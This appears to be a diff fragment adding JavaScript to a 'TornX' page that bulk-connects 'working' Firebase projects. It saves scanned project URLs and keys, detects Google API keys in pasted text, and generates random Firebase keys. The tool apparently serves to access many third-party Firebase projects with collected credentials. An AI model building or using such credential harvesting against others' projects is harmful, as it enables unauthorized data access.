+      _toast.querySelector('.tornx-con-toast-x').onclick=()=>{
+        _toast.classList.remove('show');
+        setTimeout(()=>{if(_toast){_toast.remove();_toast=null;}},350);
+        clearTimeout(_toastTimer);
+      };
+      document.body.appendChild(_toast);
+    }
+    _toast.querySelector('[data-n]').textContent=count;
+    requestAnimationFrame(()=>_toast.classList.add('show'));
+    clearTimeout(_toastTimer);
+    _toastTimer=setTimeout(()=>{
+      _toast&&_toast.classList.remove('show');
+      setTimeout(()=>{if(_toast){_toast.remove();_toast=null;}},350);
+    },8000);
+  }
+
+  /* ══════════════════════════════════════════════════════════
+     CONNECT-ALL ENGINE
+     1. Merge working projects into localStorage accounts
+     2. SessionStorage flag → after reload, click Connect All
+     ══════════════════════════════════════════════════════════ */
+  function connectAllNow(projects){
+    if(!projects||!projects.length){alert('No working projects to connect.');return;}
+
+    // 1 — merge into localStorage (skip duplicates)
+    const existing=loadAccounts();
+    let added=0;
+    projects.forEach(p=>{
+      const url=norm(p.url);
+      if(!url)return;
+      const dup=existing.find(e=>norm(e.url).toLowerCase()===url.toLowerCase());
+      if(dup){
+        if(p.key&&!dup.key)dup.key=p.key; // update key if we have one
+        return;
+      }
+      existing.push({id:Date.now()+Math.random(),url,key:p.key||'',date:new Date().toLocaleString()});
+      added++;
+    });
+    saveAccounts(existing);
+
+    // 2 — set flag so after reload we auto-click Connect All
+    try{sessionStorage.setItem(SI_AUTO,String(existing.length));}catch{}
+
+    // 3 — show count and reload
+    const total=existing.length;
+    if(confirm(`✅ ${added} new Firebase project${added!==1?'s':''} added (${total} total saved).\n\nReload to connect all to dashboard?`)){
+      location.reload();
+    }
+  }
+
+  /* After reload: if flag is set, wait for ".torn-connect-all" and click it */
+  function autoConnectAfterReload(){
+    const flag=sessionStorage.getItem(SI_AUTO);
+    if(!flag)return;
+    sessionStorage.removeItem(SI_AUTO);
+    let tries=0;
+    const t=setInterval(()=>{
+      const btn=document.querySelector('.torn-connect-all');
+      if(btn){clearInterval(t);btn.click();showToast(parseInt(flag)||1);}
+      if(++tries>40)clearInterval(t);
+    },250);
+  }
+  autoConnectAfterReload();
+
+  /* ── collect scan results from bulk panel DOM ── */
+  function getWorkingProjects(){
+    // From session storage (set by existing V14 scan)
+    let projects=[];
+    try{
+      const stored=JSON.parse(sessionStorage.getItem('tornx_bulk_working_projects')||'[]');
+      if(Array.isArray(stored)&&stored.length)projects=stored;
+    }catch{}
+    if(projects.length)return projects;
+
+    // Fallback: scrape [data-connect] attributes from results
+    document.querySelectorAll('[data-connect]').forEach(el=>{
+      const url=el.getAttribute('data-connect');
+      if(url)projects.push({url,key:''});
+    });
+    // Also scrape from result divs marked working
+    document.querySelectorAll('.tornx-bulk-result.working').forEach(el=>{
+      const urlEl=el.querySelector('.tornx-result-url');
+      if(urlEl){const url=urlEl.textContent.trim();if(url)projects.push({url,key:''});}
+    });
+    return [...new Map(projects.map(p=>[norm(p.url),p])).values()];
+  }
+
+  /* ── install into bulk panel DOM ── */
+  function install(){
+    /* ① Random Key button — wrap secret-key input */
+    document.querySelectorAll('input').forEach(inp=>{
+      if(!inp.placeholder||!/Firebase secret key/i.test(inp.placeholder))return;
+      if(inp.dataset.tornxRk)return;
+      inp.dataset.tornxRk='1';
+      const wrap=document.createElement('div');
+      wrap.className='tornx-key-wrap';
+      inp.parentNode.insertBefore(wrap,inp);
+      wrap.appendChild(inp);
+      Object.assign(inp.style,{borderRadius:'0',border:'none',flex:'1',minWidth:'0'});
+      const btn=document.createElement('button');
+      btn.type='button'; btn.className='tornx-rk-btn';
+      btn.title='Generate a random Firebase API key';
+      btn.innerHTML=si('<polyline points="1 4 1 10 7 10"/><path d="M3.51 15a9 9 0 1 0 .49-3.57"/>') + ' Random';
+      btn.onclick=()=>{setRV(inp,randKey());inp.focus();};
+      wrap.appendChild(btn);
+    });
+
+    /* ② Key-detect hint in bulk textarea */
+    document.querySelectorAll('textarea[data-bulk-input]').forEach(ta=>{
+      if(ta.dataset.tornxKd)return;
+      ta.dataset.tornxKd='1';
+      let hint=ta.parentElement.querySelector('.tornx-dk-hint');
+      if(!hint){hint=document.createElement('div');hint.className='tornx-dk-hint';ta.insertAdjacentElement('afterend',hint);}
+      const re=/AIzaSy[A-Za-z0-9_-]{33}/g;
+      const chk=()=>{
+        const keys=[...new Set([...ta.value.matchAll(re)].map(m=>m[0]))];
+        if(keys.length){
+          hint.innerHTML=`${si('<circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/>')} <strong>${keys.length} API key${keys.length>1?'s':''} detected</strong> in pasted text`;
+          hint.classList.add('on');
+        }else hint.classList.remove('on');
+      };
+      ta.addEventListener('input',chk);
+      ta.addEventListener('paste',()=>setTimeout(chk,40));
+    });
+
+    /* ③ "Connect All Working at Once" — add after [data-final-actions] */
+    document.querySelectorAll('[data-final-actions]').forEach(fa=>{
+      if(fa.querySelector('.tornx-ca-btn'))return;
+      const cw=fa.querySelector('[data-connect-working]');
+      if(!cw)return;
+      const btn=document.createElement('button');
+      btn.type='button'; btn.className='tornx-ca-btn';
+      btn.innerHTML=si('<path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/>') + ' Connect ALL Working Firebase at Once';
+      btn.onclick=()=>{
+        const projects=getWorkingProjects();
+        connectAllNow(projects);
+      };
+      fa.insertBefore(btn,cw);
+    });
+
+    /* ④ Also add button in Bulk Working Projects card */
+    document.querySelectorAll('.tornx-bulk-working-card').forEach(card=>{
+      if(card.querySelector('.tornx-ca-btn'))return;
+      const inner=card.querySelector('.min-h-0');
+      if(!inner)return;
+      const btn=document.createElement('button');
+      btn.type='button'; btn.className='tornx-ca-btn';
+      btn.style.cssText='margin:0 12px 10px;width:calc(100% - 24px)';
+      btn.innerHTML=si('<path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/>') + ' Connect ALL Working Firebase at Once';
+      btn.onclick=()=>{
+        let projects=[];
+        try{projects=JSON.parse(sessionStorage.getItem('tornx_bulk_working_projects')||'[]');}catch{}
+        if(!projects.length){
+          inner.querySelectorAll('span.font-mono').forEach(s=>{
+            const u=s.textContent.trim();
+            if(u.includes('firebase'))projects.push({url:u,key:''});
+          });
+        }
+        connectAllNow(projects);
+      };
+      inner.prepend(btn);
+    });
+  }
+
+  /* ── listen for connect-working to show toast ── */
+  window.addEventListener('tornx:connect-working',e=>{
+    const n=(e.detail&&e.detail.projects&&e.detail.projects.length)||0;
+    if(n)showToast(n);
+  });
+
+  /* ── boot ── */
+  const mo=new MutationObserver(()=>{ try{install();}catch{} });
+  mo.observe(document.body,{childList:true,subtree:true});
+  [200,600,1400,2800].forEach(t=>setTimeout(()=>{try{install();}catch{}},t));
+  document.addEventListener('click',e=>{
+    if(e.target.closest?.('.torn-new-account'))setTimeout(()=>{try{install();}catch{}},180);
+  },{capture:true});
+})();
+</script>
 </body>
 </html>
-
